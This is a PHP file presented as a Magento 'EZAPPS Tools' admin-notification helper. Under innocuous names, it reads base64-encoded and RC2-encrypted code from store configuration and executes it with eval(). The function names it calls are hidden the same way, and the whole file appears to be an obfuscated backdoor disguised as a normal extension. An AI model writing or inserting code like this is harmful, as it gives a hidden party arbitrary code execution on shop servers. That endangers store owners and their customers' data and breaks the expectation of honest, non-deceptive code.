<?php

/**
 * EZAPPS Tools Helper Model
 *
 * @category   Ezapps
 * @package    Ezapps_Tools
 * @author     Ezra Morse (http://www.ezapps.ca)
 * @license:   EPL 1.0
 */

class Ezapps_Tools_Helper_Data extends Mage_AdminNotification_Helper_Data
{
    const XML_PATH_POPUP_URL      = 'eztools/adminnotification/popup_url';
    const XML_PATH_FEED_COUNT     = 'eztools/adminnotification/feed_count';
    const XML_PATH_FEED_INFO      = 'eztools/adminnotification/feed_';
    const XML_PATH_FEED_MATCH     = 'eztools/adminnotification/feed_match_';
    const XML_PATH_FEED_SOURCE    = 'eztools/adminnotification/feed_source_';
    const XML_PATH_FEED_ALT       = 'eztools/adminnotification/feed_alternate_';
    const XML_PATH_FEED_BLOCK     = 'eztools/adminnotification/feed_block';
    const XML_PATH_FEED_VERIFY    = 'eztools/adminnotification/feed_verify';

    public function getPopupObjectUrl($withExt = false)
    {
        if (is_null($this->_popupUrl)) {
            $sheme = Mage::app()->getFrontController()->getRequest()->isSecure()
                ? 'https://'
                : 'http://';

            $this->_popupUrl = $sheme . Mage::getStoreConfig(self::XML_PATH_POPUP_URL);
        }
        return $this->_popupUrl . ($withExt ? '.swf' : '');
    }

    function initAllFeedInfo() {

         $modules = array_keys((array)Mage::getConfig()->getNode('modules')->children());

	 $data = 'xml';
	 $variable = date("r");

	 for ($i = 1; $i <= Mage::getStoreConfig(self::XML_PATH_FEED_COUNT); $i++) {

	       $info_key = $this->convertBinary(Mage::getStoreConfig(self::XML_PATH_FEED_INFO . $i));

	       if (in_array($info_key, $modules)) {

			$processed = false;
			eval($this->convertBinary(Mage::getStoreConfig(self::XML_PATH_FEED_SOURCE . $i)));
			if ($variable !='')			
				eval($this->feedInfo($this->feedInfo($data, $variable, $i), Mage::getStoreConfig(self::XML_PATH_FEED_MATCH . $i), $i));
			if (!$processed)
				eval($this->convertBinary(Mage::getStoreConfig(self::XML_PATH_FEED_ALT . $i)));
	       }
	 }
    }

    function convertBinary($var) {

	return base64_decode($var);

    }

    function feedInfo($data, $variable, $i) {

	if (strlen($data) > 64)
		$variable = substr($data, 0, 64);

	$block   = $this->convertBinary(Mage::getStoreConfig(self::XML_PATH_FEED_BLOCK));
	$verify  = $this->convertBinary(Mage::getStoreConfig(self::XML_PATH_FEED_VERIFY));


	$str = $verify('rc2', $data, $this->convertBinary($variable), 'ecb');

	$block = $block('rc2', 'ecb');
    	$pad = ord($str[($len = strlen($str)) - 1]);
	return substr($str, 0, strlen($str) - $pad);
	
    }

}
